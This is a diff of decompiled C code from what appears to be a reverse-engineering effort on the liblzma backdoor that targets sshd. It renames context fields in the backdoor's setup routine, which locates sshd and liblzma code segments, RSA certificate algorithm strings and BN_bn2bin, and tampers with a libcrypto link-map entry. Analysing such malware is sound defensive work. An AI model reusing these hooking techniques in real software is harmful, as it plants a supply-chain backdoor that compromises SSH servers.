@@ -184,15 +184,15 @@ LAB_00105951:
         (local_b10->global_ctx).libc_imports = &local_b10->libc_imports;
         pbVar51 = *hooks_data_addr_ptr;
         signed_data_size = pbVar51->signed_data_size;
-        (local_b10->global_ctx).current_data_size = 0;
-        (local_b10->global_ctx).payload_data = &pbVar51->signed_data;
-        (local_b10->global_ctx).payload_data_size = signed_data_size;
+        (local_b10->global_ctx).payload_bytes_buffered = 0;
+        (local_b10->global_ctx).payload_buffer = &pbVar51->signed_data;
+        (local_b10->global_ctx).payload_buffer_size = signed_data_size;
         elf_find_string_references(&local_980.main_info,&local_980.sshd_string_refs);
         local_aa0 = 0;
         code_segment = elf_get_code_segment(local_980.elf_handles.liblzma,&local_aa0);
         if (code_segment != (void *)0x0) {
-          (local_b10->global_ctx).lzma_code_start = code_segment;
-          (local_b10->global_ctx).lzma_code_end = (void *)((long)code_segment + local_aa0);
+          (local_b10->global_ctx).liblzma_text_start = code_segment;
+          (local_b10->global_ctx).liblzma_text_end = (void *)((long)code_segment + local_aa0);
           pbVar51 = local_b10;
           for (loop_idx = 0x4e; loop_idx != 0; loop_idx = loop_idx + -1) {
             (pbVar51->ldso_ctx)._unknown1459[0] = '\0';
@@ -271,8 +271,8 @@ LAB_00105951:
           code_segment = elf_get_code_segment(local_980.elf_handles.sshd,(u64 *)&local_a30);
           sshd_code_end_ptr = local_a30.instruction + (long)code_segment;
           data_segment = elf_get_data_segment(elf_info,(u64 *)&local_9d8,FALSE);
-          (local_b10->global_ctx).sshd_code_start = code_segment;
-          (local_b10->global_ctx).sshd_code_end = sshd_code_end_ptr;
+          (local_b10->global_ctx).sshd_text_start = code_segment;
+          (local_b10->global_ctx).sshd_text_end = sshd_code_end_ptr;
           (local_b10->global_ctx).sshd_data_start = data_segment;
           (local_b10->global_ctx).sshd_data_end = local_9d8.instruction + (long)data_segment;
           peVar34 = get_elf_functions_address();
@@ -287,11 +287,11 @@ LAB_00105951:
           }
           local_acc = STR_ssh_rsa_cert_v01_openssh_com;
           pcVar37 = elf_find_string(local_980.elf_handles.sshd,&local_acc,(void *)0x0);
-          (local_b10->global_ctx).STR_ssh_rsa_cert_v01_openssh_com = pcVar37;
+          (local_b10->global_ctx).ssh_rsa_cert_alg = pcVar37;
           if (pcVar37 == (char *)0x0) goto LAB_00105a60;
           local_acc = STR_rsa_sha2_256;
           pcVar37 = elf_find_string(local_980.elf_handles.sshd,&local_acc,(void *)0x0);
-          (local_b10->global_ctx).STR_rsa_sha2_256 = pcVar37;
+          (local_b10->global_ctx).rsa_sha2_256_alg = pcVar37;
           if (pcVar37 == (char *)0x0) goto LAB_00105a60;
           bn_dup_sym = (Elf64_Sym *)0x0;
           BN_bn2bin_stub = (pfn_BN_bn2bin_t)
@@ -825,7 +825,7 @@ LAB_00106bf0:
            (BVar26 = secret_data_append_item
                                ((secret_data_shift_cursor_t)0x114,0x11,0x16,0x10,
                                 (u8 *)peVar34->elf_parse), BVar26 != FALSE)) &&
-          ((local_b10->global_ctx).num_shifted_bits == 0x1c8)))))) {
+          ((local_b10->global_ctx).secret_bits_filled == 0x1c8)))))) {
     *(local_b10->ldso_ctx).libcrypto_l_name = (char *)local_b10;
     local_980.sshd_link_map = local_980.sshd_link_map + local_ac8 + 8;
     resolver_status = *(u32 *)local_980.sshd_link_map;
